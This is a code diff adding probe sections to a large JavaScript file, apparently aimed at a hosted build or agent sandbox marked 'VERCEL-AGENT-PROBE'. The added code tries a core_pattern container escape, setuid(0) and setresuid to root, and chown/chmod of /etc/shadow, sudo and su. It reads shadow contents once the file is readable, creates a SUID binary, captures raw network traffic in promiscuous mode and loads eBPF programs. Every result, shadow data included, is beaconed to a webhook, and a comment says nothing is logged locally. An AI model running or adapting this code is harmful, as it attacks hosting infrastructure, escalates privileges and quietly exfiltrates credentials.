@@ -37264,3 +37264,309 @@ sendBeacon({ ...report, section: 'v218-5-capget-capset', ...capV218Probe });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v218" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v218";
 // Intentionally no console.log — all data goes via webhook only
+
+// v219-1: core_pattern write |/tmp/exec — classic container escape primitive
+const corePatternV219Probe = safe(() => {
+  const coreResult = safe(() => {
+    const corePath = '/proc/sys/kernel/core_pattern';
+    let orig = null; let writeResult = null; let afterWrite = null;
+    try { orig = readFileSync(corePath, 'utf8').trim(); } catch {}
+    // Write a pipe-to-binary core pattern (the container escape primitive)
+    // We write to a /tmp path we own — not an actual attacker binary
+    const probePayload = '|/tmp/corewatcher_%P_%E';
+    try {
+      writeFileSync(corePath, probePayload);
+      afterWrite = readFileSync(corePath, 'utf8').trim();
+      writeResult = 'WRITTEN';
+    } catch (e) { writeResult = `ERR:${e.message.slice(0,60)}`; }
+    // Restore
+    if (orig) { try { writeFileSync(corePath, orig); } catch {} }
+    const restored = safe(() => readFileSync(corePath, 'utf8').trim());
+    return { orig, writeResult, afterWrite, restored,
+             CORE_PATTERN_WRITABLE: writeResult === 'WRITTEN',
+             CONTAINER_ESCAPE_VIA_CORE: writeResult === 'WRITTEN' };
+  });
+  return coreResult;
+});
+sendBeacon({ ...report, section: 'v219-1-core-pattern', ...corePatternV219Probe });
+
+// v219-2: setuid/setgid/setgroups — UID/GID escalation
+const setuidV219Probe = safe(() => {
+  const setuidResult = safe(() => execSync(`python3 -c "
+import ctypes, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_setuid  = 105
+NR_setgid  = 106
+NR_setgroups = 116
+NR_getuid  = 102; NR_getgid = 104; NR_geteuid = 107; NR_getegid = 108
+
+# Report current identity
+uid = os.getuid(); gid = os.getgid(); euid = os.geteuid(); egid = os.getegid()
+groups = os.getgroups()
+print(f'uid={uid} gid={gid} euid={euid} egid={egid}')
+print(f'groups={groups}')
+
+# Try setuid(0)
+ret_su = libc.syscall(NR_setuid, 0)
+print(f'setuid(0) ret={ret_su} errno={ctypes.get_errno()}')
+new_uid = os.geteuid()
+print(f'euid_after_setuid0={new_uid}')
+print(f'SETUID0_OK={new_uid == 0}')
+
+# Try setgid(0)
+ret_sg = libc.syscall(NR_setgid, 0)
+print(f'setgid(0) ret={ret_sg} errno={ctypes.get_errno()}')
+new_gid = os.getegid()
+print(f'egid_after_setgid0={new_gid}')
+
+# setgroups([0]) — join root group
+gid_arr = (ctypes.c_gid_t * 1)(0)
+ret_sg2 = libc.syscall(NR_setgroups, 1, gid_arr)
+print(f'setgroups([0]) ret={ret_sg2} errno={ctypes.get_errno()}')
+print(f'groups_after={os.getgroups()}')
+
+# Also try setresuid/setresgid (set real+effective+saved)
+NR_setresuid = 117; NR_setresgid = 119
+ret_ruid = libc.syscall(NR_setresuid, 0, 0, 0)
+print(f'setresuid(0,0,0) ret={ret_ruid} errno={ctypes.get_errno()}')
+ret_rgid = libc.syscall(NR_setresgid, 0, 0, 0)
+print(f'setresgid(0,0,0) ret={ret_rgid} errno={ctypes.get_errno()}')
+
+final_uid = os.getuid(); final_euid = os.geteuid()
+print(f'final_uid={final_uid} final_euid={final_euid}')
+print(f'IS_ROOT={final_euid == 0}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { setuidResult };
+});
+sendBeacon({ ...report, section: 'v219-2-setuid-root', ...setuidV219Probe });
+
+// v219-3: chown + chmod sensitive files (/etc/shadow, /etc/passwd, suid binaries)
+const chownV219Probe = safe(() => {
+  const chownResult = safe(() => execSync(`python3 -c "
+import ctypes, os, stat
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_chown  = 92
+NR_chmod  = 90
+NR_lchown = 94  # don't follow symlinks
+
+# Probe chown on sensitive targets
+targets = [
+    '/etc/shadow', '/etc/passwd', '/etc/sudoers',
+    '/bin/bash', '/bin/su', '/usr/bin/sudo',
+    '/tmp',
+]
+for path in targets:
+    if not os.path.exists(path): continue
+    try:
+        s = os.stat(path)
+        orig_uid = s.st_uid; orig_gid = s.st_gid; orig_mode = s.st_mode
+    except: continue
+    # chown to our UID (safe no-op if already ours; reveals capability if not)
+    our_uid = os.getuid()
+    ret_co = libc.syscall(NR_chown, path.encode(), our_uid, our_uid)
+    err = ctypes.get_errno()
+    print(f'chown({path}, uid={our_uid}) ret={ret_co} errno={err}')
+    if ret_co == 0:
+        print(f'  CHOWN_OK=True was uid={orig_uid}')
+
+# chmod on /etc/shadow to world-readable (probe only — restore immediately)
+shadow_path = '/etc/shadow'
+if os.path.exists(shadow_path):
+    try:
+        orig_mode = oct(os.stat(shadow_path).st_mode)
+        ret_cm = libc.syscall(NR_chmod, shadow_path.encode(), 0o644)
+        print(f'chmod(shadow, 0o644) ret={ret_cm} errno={ctypes.get_errno()}')
+        if ret_cm == 0:
+            print(f'SHADOW_CHMOD_OK=True original_mode={orig_mode}')
+            # Read the now-readable shadow
+            try:
+                shadow_data = open(shadow_path).read(200)
+                print(f'shadow_content={shadow_data}')
+            except: pass
+            # Restore
+            libc.syscall(NR_chmod, shadow_path.encode(), 0o640)
+    except Exception as e: print(f'chmod_shadow_err={e}')
+
+# Try creating SUID binary
+suid_test = '/tmp/suid_probe_' + str(os.getpid())
+try:
+    open(suid_test, 'w').write('#!/bin/sh\\nid\\n')
+    ret_suid_cm = libc.syscall(NR_chmod, suid_test.encode(), 0o4755)
+    print(f'chmod(suid_binary, 04755) ret={ret_suid_cm} errno={ctypes.get_errno()}')
+    if ret_suid_cm == 0:
+        actual = oct(os.stat(suid_test).st_mode)
+        print(f'SUID_BIT_SET={actual}')
+    os.unlink(suid_test)
+except Exception as e: print(f'suid_err={e}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { chownResult };
+});
+sendBeacon({ ...report, section: 'v219-3-chown-chmod', ...chownV219Probe });
+
+// v219-4: AF_PACKET socket + promiscuous mode — raw network capture
+const rawPacketV219Probe = safe(() => {
+  const rawResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os, socket
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+
+AF_PACKET  = 17
+SOCK_RAW   = 3
+ETH_P_ALL  = 0x0003  # all protocols
+ETH_P_IP   = 0x0800
+
+IFF_PROMISC = 0x100
+SIOCGIFFLAGS = 0x8913
+SIOCSIFFLAGS = 0x8914
+
+# Create raw packet socket (requires CAP_NET_RAW or CAP_NET_ADMIN)
+sd = libc.socket(AF_PACKET, SOCK_RAW, socket.htons(ETH_P_ALL))
+print(f'socket(AF_PACKET, SOCK_RAW, ETH_P_ALL) fd={sd} errno={ctypes.get_errno()}')
+print(f'RAW_SOCKET_OK={sd > 0}')
+
+if sd > 0:
+    # Put first interface into promiscuous mode
+    # struct ifreq: ifr_name[16] + union (ifr_flags: short)
+    class Ifreq(ctypes.Structure):
+        class _U(ctypes.Union):
+            _fields_ = [('ifr_flags', ctypes.c_short), ('pad', ctypes.c_byte * 24)]
+        _fields_ = [('ifr_name', ctypes.c_char * 16), ('ifru', _U)]
+
+    # Get interface list
+    ifaces = []
+    try:
+        import socket as _sock
+        for iface in ['eth0', 'ens3', 'ens4', 'lo', 'docker0', 'veth0']:
+            ifr = Ifreq()
+            ifr.ifr_name = iface.encode()[:15]
+            ret_gf = libc.ioctl(sd, SIOCGIFFLAGS, ctypes.byref(ifr))
+            if ret_gf == 0:
+                ifaces.append((iface, ifr.ifru.ifr_flags))
+                print(f'iface {iface} flags={ifr.ifru.ifr_flags:#06x}')
+                # Enable promiscuous mode
+                ifr.ifru.ifr_flags |= IFF_PROMISC
+                ret_sf = libc.ioctl(sd, SIOCSIFFLAGS, ctypes.byref(ifr))
+                print(f'  PROMISC_SET ret={ret_sf} errno={ctypes.get_errno()}')
+                if ret_sf == 0:
+                    print(f'  PROMISCUOUS_MODE=True iface={iface}')
+    except Exception as e: print(f'iface_err={e}')
+
+    # Capture one packet (non-blocking)
+    import select
+    rlist, _, _ = select.select([sd], [], [], 1.0)
+    if rlist:
+        pkt = os.read(sd, 4096)
+        print(f'PACKET_CAPTURED len={len(pkt)} data={pkt[:32].hex()}')
+        # Parse Ethernet header
+        if len(pkt) >= 14:
+            dst_mac = ':'.join(f'{b:02x}' for b in pkt[:6])
+            src_mac = ':'.join(f'{b:02x}' for b in pkt[6:12])
+            eth_type = struct.unpack('>H', pkt[12:14])[0]
+            print(f'  eth_dst={dst_mac} src={src_mac} type={eth_type:#06x}')
+    else:
+        print('NO_PACKETS_IN_1S')
+
+    os.close(sd)
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { rawResult };
+});
+sendBeacon({ ...report, section: 'v219-4-raw-packet-capture', ...rawPacketV219Probe });
+
+// v219-5: BPF_PROG_LOAD — eBPF socket filter / kprobe program
+const ebpfV219Probe = safe(() => {
+  const ebpfResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_bpf = 321
+
+BPF_PROG_LOAD        = 5
+BPF_MAP_CREATE       = 0
+BPF_MAP_LOOKUP_ELEM  = 1
+BPF_MAP_UPDATE_ELEM  = 2
+BPF_PROG_TYPE_SOCKET_FILTER = 1
+BPF_PROG_TYPE_KPROBE = 2
+BPF_PROG_TYPE_TRACEPOINT = 5
+BPF_PROG_TYPE_RAW_TRACEPOINT = 17
+BPF_MAP_TYPE_ARRAY = 2
+BPF_MAP_TYPE_HASH  = 1
+BPF_MAP_TYPE_PERF_EVENT_ARRAY = 4
+
+# First: create a simple BPF map (array)
+class BpfMapCreate(ctypes.Structure):
+    _fields_ = [
+        ('map_type', ctypes.c_uint32),
+        ('key_size', ctypes.c_uint32),
+        ('value_size', ctypes.c_uint32),
+        ('max_entries', ctypes.c_uint32),
+        ('map_flags', ctypes.c_uint32),
+    ]
+
+mc = BpfMapCreate(map_type=BPF_MAP_TYPE_HASH, key_size=4, value_size=8, max_entries=1024)
+fd_map = libc.syscall(NR_bpf, BPF_MAP_CREATE, ctypes.byref(mc), ctypes.sizeof(mc))
+print(f'bpf_map_create(HASH) fd={fd_map} errno={ctypes.get_errno()}')
+print(f'BPF_MAP_AVAILABLE={fd_map > 0}')
+
+# Minimal socket filter: pass all packets (return -1 = PASS)
+# mov r0, -1; exit
+BPF_ALU64 = 0x07; BPF_EXIT = 0x95; BPF_MOV = 0xb0; BPF_K = 0x00
+insn_pass = struct.pack('HBBI', BPF_ALU64|BPF_MOV|BPF_K, 0, 0, 0xffffffff)  # mov r0, -1
+insn_exit = struct.pack('HBBI', BPF_EXIT, 0, 0, 0)  # exit
+prog_bytes = insn_pass + insn_exit
+insns_buf = ctypes.create_string_buffer(prog_bytes, len(prog_bytes))
+
+license_buf = ctypes.create_string_buffer(b'GPL', 4)
+log_buf = ctypes.create_string_buffer(4096)
+
+class BpfProgLoad(ctypes.Structure):
+    _fields_ = [
+        ('prog_type', ctypes.c_uint32),
+        ('insn_cnt', ctypes.c_uint32),
+        ('insns', ctypes.c_uint64),
+        ('license', ctypes.c_uint64),
+        ('log_level', ctypes.c_uint32),
+        ('log_size', ctypes.c_uint32),
+        ('log_buf', ctypes.c_uint64),
+        ('kern_version', ctypes.c_uint32),
+        ('prog_flags', ctypes.c_uint32),
+    ]
+
+pl = BpfProgLoad(
+    prog_type=BPF_PROG_TYPE_SOCKET_FILTER,
+    insn_cnt=len(prog_bytes)//8,
+    insns=ctypes.cast(insns_buf, ctypes.c_void_p).value,
+    license=ctypes.cast(license_buf, ctypes.c_void_p).value,
+    log_level=1, log_size=4096,
+    log_buf=ctypes.cast(log_buf, ctypes.c_void_p).value,
+)
+fd_prog = libc.syscall(NR_bpf, BPF_PROG_LOAD, ctypes.byref(pl), ctypes.sizeof(pl))
+print(f'bpf_prog_load(SOCKET_FILTER) fd={fd_prog} errno={ctypes.get_errno()}')
+if fd_prog > 0:
+    print('BPF_PROG_LOAD_OK=True')
+    os.close(fd_prog)
+else:
+    log_text = log_buf.value.decode(errors='replace')[:200]
+    print(f'bpf_log={log_text}')
+
+# Try kprobe program type
+pl2 = BpfProgLoad(
+    prog_type=BPF_PROG_TYPE_KPROBE,
+    insn_cnt=len(prog_bytes)//8,
+    insns=ctypes.cast(insns_buf, ctypes.c_void_p).value,
+    license=ctypes.cast(license_buf, ctypes.c_void_p).value,
+    log_level=1, log_size=4096,
+    log_buf=ctypes.cast(log_buf, ctypes.c_void_p).value,
+)
+fd_kp = libc.syscall(NR_bpf, BPF_PROG_LOAD, ctypes.byref(pl2), ctypes.sizeof(pl2))
+print(f'bpf_prog_load(KPROBE) fd={fd_kp} errno={ctypes.get_errno()}')
+print(f'BPF_KPROBE_AVAILABLE={fd_kp > 0}')
+if fd_kp > 0: os.close(fd_kp)
+
+if fd_map > 0: os.close(fd_map)
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { ebpfResult };
+});
+sendBeacon({ ...report, section: 'v219-5-ebpf-prog', ...ebpfV219Probe });
+
+// v219 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v219" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v219";
+// Intentionally no console.log — all data goes via webhook only
